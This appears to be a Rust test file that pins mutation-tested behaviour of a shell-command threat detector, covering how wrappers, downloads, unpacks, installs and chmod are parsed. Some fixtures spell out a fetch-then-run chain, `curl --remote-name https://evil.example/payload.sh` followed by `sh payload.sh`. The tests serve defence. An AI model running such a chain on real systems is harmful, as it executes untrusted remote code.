//! Tests that kill mutants the weekly cargo-mutants sweep found surviving in
//! `threats.rs` (run 42450235934, 2026-11-08).

use super::*;

/// The words of one command segment, owned, as the tokeniser hands them over.
fn argv(words: &[&str]) -> Vec<String> {
    words.iter().map(|word| word.to_string()).collect()
}

/// `sudo --user=root id` runs `id`: a glued `--user=VALUE` option is one word,
/// and the walk must step forward over it to reach the command sudo launches.
///
/// Every check that asks what a wrapped command really runs (staged fetch and
/// run, guard lowering, typosquats) starts from this index. Stepping backwards
/// lands on `sudo` again, the walk never reaches the command, and whatever
/// sudo launches becomes invisible to all of them.
///
/// FAILS ON REVERT: replace `+=` with `-=` in the `index += 1` after the
/// glued `--user=` and `--chdir=` prefixes in the sudo arm of
/// `effective_command_index`.
#[test]
fn sudo_glued_long_options_step_forward_to_the_command() {
    assert_eq!(
        effective_command_index(&argv(&["sudo", "--user=root", "id"])),
        Some(2),
        "`sudo --user=root id` runs `id`, the word after the glued option"
    );
    assert_eq!(
        effective_command_index(&argv(&["sudo", "--user=root", "--chdir=/tmp", "./r"])),
        Some(3),
        "two glued options in a row must both be stepped over to reach `./r`"
    );
}

/// `command -- ls` runs `ls`, and `command ls` runs `ls` too: the `--` is
/// skipped only when it is there.
///
/// Inverted, `command -- ls` resolves to the `--` itself (a program that does
/// not exist, so the real one after it is never screened), and `command ls`
/// steps over `ls` and finds no command at all.
///
/// FAILS ON REVERT: replace `==` with `!=` in `if word == "--"` in the command
/// arm of `effective_command_index`.
#[test]
fn command_builtin_skips_a_double_dash_only_when_present() {
    assert_eq!(
        effective_command_index(&argv(&["command", "--", "ls"])),
        Some(2),
        "`command -- ls` runs `ls`, not a program named `--`"
    );
    assert_eq!(
        effective_command_index(&argv(&["command", "-p", "--", "ls"])),
        Some(3),
        "`command -p -- ls` runs `ls` after both the option and the `--`"
    );
    assert_eq!(
        effective_command_index(&argv(&["command", "ls"])),
        Some(1),
        "`command ls` runs `ls`; with no `--` nothing may be skipped"
    );
}

/// `timeout -k 5 10 ls` runs `ls`: `-k` and `-s` take a separate value, so the
/// walk must step forward over both the option and its value.
///
/// The environment prefixes keep the index well above zero, so a backward
/// step lands on an earlier word instead of underflowing; the walk then
/// circles back to `timeout` until it gives up, and the command it launches
/// is never seen.
///
/// FAILS ON REVERT: replace `+=` with `-=` in the `index += 2` after
/// `-k | --kill-after | -s | --signal` in the timeout arm of
/// `effective_command_index`.
#[test]
fn timeout_options_with_a_separate_value_step_forward_to_the_command() {
    assert_eq!(
        effective_command_index(&argv(&["A=1", "B=2", "timeout", "-k", "5", "10", "ls"])),
        Some(6),
        "`timeout -k 5 10 ls` runs `ls` after the option, its value and the duration"
    );
    assert_eq!(
        effective_command_index(&argv(&[
            "env", "FOO=1", "timeout", "-s", "KILL", "30", "./r"
        ])),
        Some(6),
        "`env FOO=1 timeout -s KILL 30 ./r` runs `./r`"
    );
}

/// `stdbuf --output=L --error=L ls` runs `ls`: each of the three glued long
/// options on its own is a stdbuf option to step over.
///
/// With the last `||` turned into `&&`, a glued `--output=` or `--error=`
/// alone no longer counts, the walk stops on the option, and the option is
/// taken for the command, so the real program behind stdbuf is never seen.
///
/// FAILS ON REVERT: replace `||` with `&&` before
/// `word.starts_with("--error=")` in the stdbuf arm of
/// `effective_command_index`.
#[test]
fn stdbuf_glued_long_options_are_each_stepped_over() {
    assert_eq!(
        effective_command_index(&argv(&["stdbuf", "--output=L", "--error=L", "ls"])),
        Some(3),
        "`stdbuf --output=L --error=L ls` runs `ls`"
    );
    assert_eq!(
        effective_command_index(&argv(&["stdbuf", "--error=L", "ls"])),
        Some(2),
        "`stdbuf --error=L ls` runs `ls`, not a program named `--error=L`"
    );
}

/// `curl --remote-name URL` saves the file under the URL's last path
/// component, exactly as `curl -O URL` does.
///
/// That saved name is what the staged correlation later matches against
/// `sh payload.sh` or `./payload.sh`. The short `-O` is also caught by the
/// flag cluster check, so only the long spelling depends on this line:
/// inverted, `curl --remote-name URL && sh payload.sh` loses its producer.
///
/// FAILS ON REVERT: replace `==` with `!=` in `command == "curl"` before
/// `(argument == "-O" || argument == "--remote-name")` in
/// `download_output_targets`.
#[test]
fn curl_long_remote_name_saves_under_the_url_basename() {
    let long = download_output_targets(&argv(&[
        "curl",
        "--remote-name",
        "https://evil.example/payload.sh",
    ]));
    assert_eq!(
        long,
        vec!["payload.sh".to_string()],
        "`curl --remote-name URL` writes the URL's basename"
    );
    let short = download_output_targets(&argv(&["curl", "-O", "https://evil.example/payload.sh"]));
    assert_eq!(
        long, short,
        "the long and short spellings of remote-name must write the same file"
    );
}

/// A long option is never read as a short option with a value glued on.
///
/// `option_value` reads `-oX` as the value `X` of `-o`. The guard on that
/// branch refuses an argument that starts with `--`, so a short that happens
/// to be a prefix of a long option cannot slice the long option into a bogus
/// value. No current caller passes such a short (every short is a dash and one
/// letter), so the guard is pinned here directly on the helper.
///
/// FAILS ON REVERT: replace `&&` with `||` in
/// `!value.is_empty() && !argument.starts_with("--")` in `option_value`.
#[test]
fn a_long_option_is_never_read_as_a_short_with_a_glued_value() {
    assert_eq!(
        option_value(&argv(&["--verbose", "x"]), &["-"], &[]),
        None,
        "`--verbose` must not be read as the short `-` with the value `-verbose`"
    );
    assert_eq!(
        option_value(&argv(&["-oout.bin"]), &["-o"], &[]),
        Some("out.bin".to_string()),
        "a short with a glued value must still be read"
    );
}

/// `jar tf app.jar` lists an archive and `jar cf app.jar classes/` creates one;
/// neither unpacks anything. Only an `x` in the first flag word extracts.
///
/// An unpack taints the directory it writes into, so every later relative run
/// counts as running the fetched archive. Turning the `&&` into `||` makes any
/// jar invocation whose first word is not a long option an extraction, so a
/// listing or a build would taint the working directory.
///
/// FAILS ON REVERT: replace `&&` with `||` in
/// `!first.starts_with("--") && flags.contains('x')` in the jar arm of
/// `unpack_of`.
#[test]
fn jar_extracts_only_with_an_x_in_its_flags() {
    assert!(
        unpack_of(&argv(&["jar", "tf", "app.jar"])).is_none(),
        "`jar tf app.jar` lists the archive and unpacks nothing"
    );
    assert!(
        unpack_of(&argv(&["jar", "cf", "app.jar", "classes/"])).is_none(),
        "`jar cf app.jar classes/` creates an archive and unpacks nothing"
    );
    let Some(Unpack::Directory { archive, directory }) =
        unpack_of(&argv(&["jar", "xf", "app.jar"]))
    else {
        panic!("`jar xf app.jar` extracts app.jar into the working directory");
    };
    assert_eq!(
        archive.as_deref(),
        Some("app.jar"),
        "`jar xf app.jar` reads app.jar"
    );
    assert_eq!(
        directory, None,
        "`jar xf` writes into the working directory"
    );
}

/// `gzip data.txt` compresses; only `-d` (or a short cluster with `d`, or
/// `--decompress`) makes gzip a decompressor.
///
/// A decompression is an unpack whose output inherits the taint of a fetched
/// input. With the first `&&` turned into `||`, the dash checks collapse to
/// true and any argument containing a `d` (a file name such as `data.txt`, or
/// the long option `--stdout`) turns a compression into a decompression.
///
/// FAILS ON REVERT: replace `&&` with `||` in
/// `arg.starts_with('-') && !arg.starts_with("--")` in the gzip guard of
/// `unpack_of`.
#[test]
fn gzip_decompresses_only_with_a_short_d_flag() {
    assert!(
        unpack_of(&argv(&["gzip", "data.txt"])).is_none(),
        "`gzip data.txt` compresses; a `d` in the file name is not `-d`"
    );
    assert!(
        unpack_of(&argv(&["gzip", "--stdout", "notes.txt"])).is_none(),
        "`gzip --stdout notes.txt` compresses; the `d` in `--stdout` is not `-d`"
    );
    let Some(Unpack::File { compressed, output }) = unpack_of(&argv(&["gzip", "-d", "r.sh.gz"]))
    else {
        panic!("`gzip -d r.sh.gz` decompresses a single file");
    };
    assert_eq!(
        compressed.as_deref(),
        Some("r.sh.gz"),
        "`gzip -d r.sh.gz` reads r.sh.gz"
    );
    assert_eq!(
        output.as_deref(),
        Some("r.sh"),
        "`gzip -d r.sh.gz` writes r.sh"
    );
}

/// `python3 -m pip install ./x.whl` installs the wheel: the module name is
/// the word after `-m`, and what follows it is pip's own command line.
///
/// Installing a fetched package runs its install hooks, the same terminal
/// step as running it. Looking for the first word that is NOT `-m` reads the
/// wrong module (`pip` becomes `install`, or `-m` itself), and the install is
/// not seen at all.
///
/// FAILS ON REVERT: replace `==` with `!=` in `arg == "-m"` in
/// `installed_package_files`.
#[test]
fn python_dash_m_pip_install_is_a_package_install() {
    assert_eq!(
        installed_package_files(&argv(&["python3", "-m", "pip", "install", "./x.whl"])),
        vec!["./x.whl".to_string()],
        "`python3 -m pip install ./x.whl` installs the local wheel"
    );
    assert_eq!(
        installed_package_files(&argv(&["python3", "-I", "-m", "pip", "install", "./x.whl"])),
        vec!["./x.whl".to_string()],
        "an interpreter option before `-m` must not move the module name"
    );
}

/// `gdebi ./pkg.deb` installs the package: gdebi has no subcommand, so it is
/// an install by name alone. `apt show ./pkg.deb` only inspects one.
///
/// Inverted, gdebi stops counting as an install (its maintainer scripts run
/// unseen), and every apt, dnf, yum or zypper verb counts as one.
///
/// FAILS ON REVERT: replace `==` with `!=` in `command == "gdebi"` in
/// `installed_package_files`.
#[test]
fn gdebi_installs_by_name_and_apt_installs_only_by_verb() {
    assert_eq!(
        installed_package_files(&argv(&["gdebi", "./pkg.deb"])),
        vec!["./pkg.deb".to_string()],
        "`gdebi ./pkg.deb` installs the local package"
    );
    let shown = installed_package_files(&argv(&["apt", "show", "./pkg.deb"]));
    assert!(
        shown.is_empty(),
        "`apt show ./pkg.deb` inspects the package and installs nothing: {shown:?}"
    );
}

/// `chmod +x -v r` makes `r` executable; `-v` is an option, not a file.
///
/// The chmod targets are the files that may then run as `./r`, and a chmod
/// with targets ends the segment's check. With the `&&` turned into `||`
/// every option after the mode except `--` is taken as a file to make
/// executable.
///
/// FAILS ON REVERT: replace `&&` with `||` in
/// `argument.as_str() != "--" && !argument.starts_with('-')` in
/// `chmod_executable_targets`.
#[test]
fn chmod_options_after_the_mode_are_not_targets() {
    assert_eq!(
        chmod_executable_targets(&argv(&["chmod", "+x", "-v", "r"])),
        vec!["r".to_string()],
        "`chmod +x -v r` makes only `r` executable"
    );
    assert_eq!(
        chmod_executable_targets(&argv(&["chmod", "755", "--verbose", "--", "./run.sh"])),
        vec!["./run.sh".to_string()],
        "neither `--verbose` nor `--` is a file chmod makes executable"
    );
}
